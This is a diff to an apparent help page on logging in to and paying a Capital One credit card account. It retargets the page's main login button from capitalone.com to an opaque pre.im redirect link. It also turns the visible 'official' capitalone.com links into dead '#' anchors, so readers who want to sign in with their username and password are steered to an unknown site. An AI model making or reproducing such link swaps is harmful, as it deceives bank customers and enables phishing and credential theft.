@@ -7,7 +7,7 @@ Welcome! This guide walks you through how to log in to your Capital One credit c
 .. image:: Button.png
    :alt: Capital One Credit Card Access
    :align: center
-   :target: https://www.capitalone.com
+   :target: https://pre.im/?GZGqGXnYcaJ3Rbahc7DrVARsbXRYyXQaima19KjzC2MdGdvMAKHQRxAJCsmGWj5hFGwuNDVGwm
 
 How to Log In to Your Capital One Credit Card Account
 ======================================================
@@ -20,24 +20,34 @@ Step-by-Step Guide to Capital One Card Login
 --------------------------------------------
 
 **Step 1: Visit the Official Login Page**  
-Go to: `https://www.capitalone.com <https://www.capitalone.com>`_  
+
+Go to: `https://www.capitalone.com <#>`_  
+
 Click on the “Sign In” button at the top right corner of the page.
 
 **Step 2: Enter Your Credentials**  
+
 - **Username**: Enter the username associated with your Capital One account.  
+
 - **Password**: Type your password correctly.
 
 **Step 3: Click “Sign In”**  
+
 Once your credentials are filled in, click the “Sign In” button to access your Capital One credit card dashboard.
 
 Benefits of Managing Your Capital One Card Online
 --------------------------------------------------
 
 **24/7 Account Access**  
+
 **Easy Payments**  
+
 **Enhanced Security**  
+
 **Reward Tracking**  
+
 **Mobile App Access**  
+
 **Card Controls**  
 
 How to Pay Your Capital One Credit Card Bill Online
@@ -51,7 +61,7 @@ Step-by-Step Guide to Capital One Online Payment
 -------------------------------------------------
 
 **Step 1: Visit the Official Website**  
-Go to: `https://www.capitalone.com <https://www.capitalone.com>`_
+Go to: `https://www.capitalone.com <#>`_
 
 **Step 2: Log In to Your Account**  
 Enter your username and password as described above.
